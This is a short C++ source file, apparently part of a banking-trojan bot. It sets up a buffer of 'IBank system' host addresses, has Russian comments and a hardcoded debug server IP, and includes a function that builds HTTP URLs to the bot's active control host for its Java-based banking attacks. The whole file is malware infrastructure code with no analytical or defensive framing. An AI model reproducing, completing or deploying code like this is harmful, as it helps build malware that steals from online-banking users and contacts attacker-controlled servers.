//---------------------------------------------------------------------------


#pragma hdrstop

#include "JavaConfig.h"
#include "Config.h"
#include "BotHTTP.h"
#include "HTTPConsts.h"

//---------------------------------------------------------------------------

//---------------------------------------------------------
//  массив ссылок хостов системы IBank
//---------------------------------------------------------
char JAVA_HOSTS[JAVA_HOSTS_BUF_SIZE] = "_JAVA_HOSTS_\0";

#define JAVA_HOSTS_HASH 0x2CFDA53B /* _JAVA_HOSTS_ */



#ifdef DEBUGCONFIG
	PCHAR JavaDebugHost = "88.198.35.59";
#endif


PCHAR GetJavaScriptURL(PCHAR Path)
{
	//  Функция возвращает полнй адрес для отдельнх
	//	серверов используемых в ява системах

	#ifdef DEBUGCONFIG
		PCHAR Host =  STR::New(JavaDebugHost);
	#else
		PCHAR Host = GetActiveHostFromBuf(JAVA_HOSTS, JAVA_HOSTS_HASH);
	#endif

	if (Host == NULL)
		return NULL;

	PCHAR Slash = NULL;

	if (Path == NULL || *Path != '/')
    	Slash = "/";

	PCHAR URL = STR::New(5, ProtocolHTTP, "://", Host, Slash, Path);;

	STR::Free(Host);

	return URL;
}
